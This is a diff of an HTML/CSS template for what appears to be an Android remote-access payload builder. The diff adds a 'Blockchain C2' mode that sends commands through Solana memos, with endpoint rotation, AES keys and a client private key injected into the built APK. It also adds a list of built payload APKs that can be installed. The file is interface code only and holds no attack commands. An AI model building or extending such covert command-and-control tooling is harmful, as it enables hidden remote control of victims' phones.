@@ -7,14 +7,132 @@
         </h3>
         <div class="builder-form">
             <div class="builder-form__group">
-                <label class="builder-form__label">Server IP</label>
-                <input type="text" class="builder-form__input" ng-model="srcIP" placeholder="192.168.0.227" ng-init="srcIP = srcIP || '192.168.0.227'">
-                <span class="builder-form__hint">Your public or local IP address</span>
+                <label class="builder-form__label">Connection Type</label>
+                <div class="connection-type-selector">
+                    <label class="connection-type-btn" ng-class="{'connection-type-btn--active': connectionType === 'tcp'}">
+                        <input type="radio" name="connectionType" ng-model="connectionType" value="tcp" ng-init="connectionType = connectionType || 'tcp'">
+                        <i class="plug icon"></i>
+                        <span>TCP/IP</span>
+                    </label>
+                    <label class="connection-type-btn" ng-class="{'connection-type-btn--active': connectionType === 'blockchain'}">
+                        <input type="radio" name="connectionType" ng-model="connectionType" value="blockchain">
+                        <i class="linkify icon"></i>
+                        <span>Blockchain C2</span>
+                    </label>
+                </div>
+                <span class="builder-form__hint">Choose connection method: Direct TCP/IP or Blockchain-based C2</span>
             </div>
-            <div class="builder-form__group">
-                <label class="builder-form__label">Port</label>
-                <input type="number" class="builder-form__input" ng-model="srcPort" min="1025" max="65535" placeholder="1234" ng-init="srcPort = srcPort || 1234">
-                <span class="builder-form__hint">Must match the listening port</span>
+            
+            <!-- TCP/IP Configuration -->
+            <div ng-if="connectionType === 'tcp'" class="tcp-config">
+                <div class="builder-form__group">
+                    <label class="builder-form__label">Server IP</label>
+                    <input type="text" class="builder-form__input" ng-model="srcIP" placeholder="192.168.0.227" ng-init="srcIP = srcIP || '192.168.0.227'">
+                    <span class="builder-form__hint">Your public or local IP address</span>
+                </div>
+                <div class="builder-form__group">
+                    <label class="builder-form__label">Port</label>
+                    <input type="number" class="builder-form__input" ng-model="srcPort" min="1025" max="65535" placeholder="1234" ng-init="srcPort = srcPort || 1234">
+                    <span class="builder-form__hint">Must match the listening port</span>
+                </div>
+            </div>
+            
+            <!-- Blockchain C2 Configuration -->
+            <div ng-if="connectionType === 'blockchain'" class="blockchain-config">
+                <div class="builder-form__group">
+                    <label class="builder-form__label">Blockchain Mode</label>
+                    <select class="builder-form__input" ng-model="blockchainChain" ng-init="blockchainChain = blockchainChain || 'solana'">
+                        <option value="solana">Solana Memo (recommended)</option>
+                        <option value="evm">EVM (legacy)</option>
+                    </select>
+                    <span class="builder-form__hint">Solana delivers memo-based commands/responses; EVM kept for backwards compatibility.</span>
+                </div>
+                <div class="builder-form__group">
+                    <label class="builder-form__label">RPC URL</label>
+                    <input type="text" class="builder-form__input" ng-model="blockchainRpcUrl" placeholder="https://api.devnet.solana.com">
+                    <span class="builder-form__hint">Solana RPC endpoint (devnet/mainnet or provider URL)</span>
+                </div>
+                <div class="builder-form__group">
+                    <label class="builder-form__label">Channel / Contract Address</label>
+                    <input type="text" class="builder-form__input" ng-model="blockchainContract" placeholder="Solana channel address (base58)">
+                    <div class="inline-actions">
+                        <button class="btn btn--secondary btn--small" type="button" ng-click="loadBlockchainKeys()">Load</button>
+                        <button class="btn btn--secondary btn--small" type="button" ng-click="saveBlockchainKeys()">Save</button>
+                    </div>
+                    <span class="builder-form__hint">Solana memo channel address (or contract for legacy EVM)</span>
+                </div>
+                <div class="builder-form__group">
+                    <label class="builder-form__label">Block Step</label>
+                    <input type="number" class="builder-form__input" ng-model="blockchainBlockStep" min="1" max="100" placeholder="10" ng-init="blockchainBlockStep = blockchainBlockStep || 10">
+                    <span class="builder-form__hint">Block interval for endpoint rotation</span>
+                </div>
+                <div class="builder-form__group">
+                    <label class="builder-form__label">Candidates Per Cycle</label>
+                    <input type="number" class="builder-form__input" ng-model="blockchainCandidates" min="1" max="20" placeholder="5" ng-init="blockchainCandidates = blockchainCandidates || 5">
+                    <span class="builder-form__hint">Number of endpoint candidates per rotation</span>
+                </div>
+                <div class="builder-form__group">
+                    <label class="builder-form__label">AES Key (Hex, 64 chars)</label>
+                    <div class="inline-actions">
+                        <input type="text" class="builder-form__input" ng-model="blockchainC2AesKey" placeholder="0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef" maxlength="64">
+                        <button class="btn btn--secondary btn--small" type="button" ng-click="generateAesKey()">Generate AES</button>
+                    </div>
+                    <span class="builder-form__hint">32-byte AES key in hexadecimal format</span>
+                </div>
+                <div class="builder-form__group">
+                    <label class="builder-form__label">Operator Private Key</label>
+                    <input type="text" class="builder-form__input" ng-model="blockchainOperatorPrivateKey" placeholder="Base58 (Solana) or 0x... (EVM)" autocomplete="off">
+                    <div class="inline-actions">
+                        <button class="btn btn--secondary btn--small" type="button" ng-click="generateOperatorKey()">Generate</button>
+                        <button class="btn btn--secondary btn--small" type="button" ng-click="loadBlockchainKeys()">Load</button>
+                        <button class="btn btn--secondary btn--small" type="button" ng-click="saveBlockchainKeys()">Save</button>
+                    </div>
+                    <span class="builder-form__hint">Funds commands/contract deploys; keep secret.</span>
+                </div>
+                <div class="builder-form__group">
+                    <label class="builder-form__label">Client Private Key (responses)</label>
+                    <input type="text" class="builder-form__input" ng-model="blockchainClientPrivateKey" placeholder="Base58 64-byte secret (Solana) or 0x..." autocomplete="off">
+                    <div class="inline-actions">
+                        <button class="btn btn--secondary btn--small" type="button" ng-click="generateClientKey()">Generate</button>
+                        <button class="btn btn--secondary btn--small" type="button" ng-click="loadBlockchainKeys()">Load</button>
+                        <button class="btn btn--secondary btn--small" type="button" ng-click="saveBlockchainKeys()">Save</button>
+                    </div>
+                    <span class="builder-form__hint">Injected so the client can post responses to the blockchain (fund with SOL).</span>
+                </div>
+                <div class="builder-form__group">
+                    <label class="builder-form__label">RPC Fallbacks (comma separated)</label>
+                    <input type="text" class="builder-form__input" ng-model="blockchainRpcFallbacks" placeholder="https://api.devnet.solana.com, https://solana-devnet.g.alchemy.com/v2/KEY">
+                    <span class="builder-form__hint">Used by builder/tests if the primary RPC is down or rate-limited.</span>
+                </div>
+                <div class="balance-row">
+                    <div class="balance-card">
+                        <div class="balance-label">Operator</div>
+                        <div class="balance-value">{{blockchainOperatorBalance || 'Balance N/A'}}</div>
+                        <div class="balance-address">{{blockchainOperatorAddress || 'Not set'}}</div>
+                    </div>
+                    <div class="balance-card">
+                        <div class="balance-label">Client</div>
+                        <div class="balance-value">{{blockchainClientBalance || 'Balance N/A'}}</div>
+                        <div class="balance-address">{{blockchainClientAddress || 'Not set'}}</div>
+                    </div>
+                    <div class="balance-card">
+                        <div class="balance-label">Channel</div>
+                        <div class="balance-value">{{blockchainChannelBalance || 'Balance N/A'}}</div>
+                        <div class="balance-address">{{blockchainContract || 'Not set'}}</div>
+                    </div>
+                </div>
+                <div class="blockchain-actions">
+                    <button class="btn btn--secondary btn--small" type="button" ng-click="refreshBlockchainBalances()">Refresh Balances</button>
+                    <button class="btn btn--secondary btn--small" type="button" ng-click="runRpcSmokeTest()">Fast RPC Test</button>
+                    <button class="btn btn--secondary btn--small" type="button" ng-click="deployBlockchainContract()" ng-disabled="blockchainChain !== 'evm'">Deploy Contract</button>
+                    <button class="btn btn--secondary btn--small" type="button" ng-click="loadBlockchainKeys()">Load All Blockchain Settings</button>
+                    <button class="btn btn--secondary btn--small" type="button" ng-click="generateOperatorKey()">New Operator Key</button>
+                </div>
+                <div class="info-box" style="padding: 12px; background: rgba(33, 150, 243, 0.1); border-left: 3px solid #2196F3; margin-top: 8px;">
+                    <p style="margin: 0; font-size: 12px; color: var(--text-primary);">
+                        <i class="info circle icon"></i> <strong>Blockchain C2:</strong> Uses Solana memos to send/receive commands. Lab modules and client list honour both TCP/IP and Blockchain paths; falls back to TCP/IP if unavailable.
+                    </p>
+                </div>
             </div>
         </div>
     </div>
@@ -309,8 +427,8 @@
     <!-- Build Actions -->
     <div class="builder-actions">
         <button class="build-btn" 
-                ng-click="clearLogs(); Build(srcIP, srcPort)" 
-                ng-disabled="!srcIP || !srcPort || (bindApk.enable && !filePath)">
+                ng-click="clearLogs(); Build(srcIP, srcPort, connectionType, blockchainRpcUrl, blockchainContract, blockchainBlockStep, blockchainCandidates, blockchainC2AesKey, blockchainClientPrivateKey, blockchainChain)" 
+                ng-disabled="(connectionType === 'tcp' && (!srcIP || !srcPort)) || (connectionType === 'blockchain' && (!blockchainRpcUrl || !blockchainC2AesKey || (blockchainC2AesKey && blockchainC2AesKey.length !== 64) || !blockchainClientPrivateKey || blockchainClientPrivateKey.length < 60)) || (bindApk.enable && !filePath)">
             <i class="hammer icon"></i>
             <span ng-if="!bindApk.enable">Build APK</span>
             <span ng-if="bindApk.enable">Bind & Build</span>
@@ -330,6 +448,48 @@
             <i class="trash icon"></i>
             Uninstall
         </button>
+    </div>
+
+    <!-- Built APKs List -->
+    <div class="builder-section" ng-init="refreshPayloads()">
+        <h3 class="builder-section__title">
+            <i class="archive icon"></i>
+            Built APKs
+            <button class="btn btn--small btn--secondary" ng-click="refreshPayloads()" style="margin-left: auto;">
+                <i class="sync icon"></i> Refresh
+            </button>
+        </h3>
+        
+        <div class="apk-list" ng-if="builtPayloads.length > 0">
+            <div class="apk-item" ng-repeat="payload in builtPayloads track by payload.name">
+                <div class="apk-info">
+                    <div class="apk-name">
+                        <i class="android icon"></i>
+                        {{payload.name}}
+                    </div>
+                    <div class="apk-meta">
+                        <span class="apk-size">{{payload.size}}</span>
+                        <span class="apk-date">{{formatDate(payload.date)}}</span>
+                    </div>
+                </div>
+                <div class="apk-actions">
+                    <button class="btn btn--small btn--primary" ng-click="installApk(payload.path)" title="Install on device">
+                        <i class="download icon"></i> Install
+                    </button>
+                    <button class="btn btn--small btn--secondary" ng-click="copyPayloadPath(payload)" title="Copy path">
+                        <i class="copy icon"></i>
+                    </button>
+                    <button class="btn btn--small btn--danger" ng-click="deletePayload(payload)" title="Delete">
+                        <i class="trash icon"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="apk-empty" ng-if="builtPayloads.length === 0">
+            <i class="inbox icon"></i>
+            <p>No APKs built yet. Build your first payload above!</p>
+        </div>
     </div>
 </div>
 
@@ -867,6 +1027,104 @@
         color: #fff;
     }
     
+    /* Connection Type Selector */
+    .connection-type-selector {
+        display: flex;
+        gap: 12px;
+        margin-bottom: 12px;
+    }
+    
+    .connection-type-btn {
+        flex: 1;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        padding: 12px 16px;
+        background: var(--bg-primary);
+        border: 2px solid var(--border-color);
+        border-radius: 8px;
+        font-size: 13px;
+        color: var(--text-secondary);
+        cursor: pointer;
+        transition: all 0.2s;
+    }
+    
+    .connection-type-btn input {
+        display: none;
+    }
+    
+    .connection-type-btn--active {
+        background: var(--accent-primary);
+        border-color: var(--accent-primary);
+        color: #fff;
+    }
+    
+    .connection-type-btn:hover {
+        border-color: var(--accent-primary);
+    }
+    
+    .tcp-config, .blockchain-config {
+        margin-top: 16px;
+        padding-top: 16px;
+        border-top: 1px solid var(--border-color);
+    }
+    
+    .inline-actions {
+        display: flex;
+        gap: 6px;
+        flex-wrap: wrap;
+        margin-top: 6px;
+    }
+    
+    .balance-row {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 8px;
+        margin-top: 8px;
+    }
+    
+    .balance-card {
+        padding: 10px;
+        background: var(--bg-primary);
+        border: 1px solid var(--border-color);
+        border-radius: 6px;
+    }
+    
+    .balance-label {
+        font-size: 11px;
+        color: var(--text-secondary);
+        margin-bottom: 4px;
+    }
+    
+    .balance-value {
+        font-size: 14px;
+        font-weight: 600;
+        color: var(--text-primary);
+    }
+    
+    .balance-address {
+        font-size: 11px;
+        color: var(--text-muted);
+        font-family: var(--font-mono);
+        word-break: break-all;
+    }
+    
+    .blockchain-actions {
+        display: flex;
+        gap: 8px;
+        flex-wrap: wrap;
+        margin-top: 10px;
+    }
+    
+    .info-box {
+        padding: 12px;
+        background: rgba(33, 150, 243, 0.1);
+        border-left: 3px solid #2196F3;
+        border-radius: 4px;
+        margin-top: 8px;
+    }
+    
     .selected-file {
         margin-left: 10px;
         font-size: 12px;
@@ -906,5 +1164,92 @@
     
     .build-btn i {
         font-size: 16px;
+    }
+    
+    /* APK List */
+    .apk-list {
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+        max-height: 300px;
+        overflow-y: auto;
+    }
+    
+    .apk-item {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 10px 12px;
+        background: var(--bg-primary);
+        border: 1px solid var(--border-color);
+        border-radius: 6px;
+        transition: all 0.15s;
+    }
+    
+    .apk-item:hover {
+        border-color: var(--accent-primary);
+        background: var(--bg-tertiary);
+    }
+    
+    .apk-info {
+        flex: 1;
+        min-width: 0;
+    }
+    
+    .apk-name {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-size: 13px;
+        font-weight: 500;
+        color: var(--text-primary);
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+    
+    .apk-name i {
+        color: #3ddc84;
+        flex-shrink: 0;
+    }
+    
+    .apk-meta {
+        display: flex;
+        gap: 12px;
+        margin-top: 4px;
+        font-size: 11px;
+        color: var(--text-muted);
+    }
+    
+    .apk-size {
+        color: var(--text-secondary);
+    }
+    
+    .apk-actions {
+        display: flex;
+        gap: 6px;
+        flex-shrink: 0;
+        margin-left: 12px;
+    }
+    
+    .apk-empty {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 32px;
+        color: var(--text-muted);
+        text-align: center;
+    }
+    
+    .apk-empty i {
+        font-size: 32px;
+        margin-bottom: 8px;
+        opacity: 0.5;
+    }
+    
+    .apk-empty p {
+        margin: 0;
+        font-size: 13px;
     }
 </style>
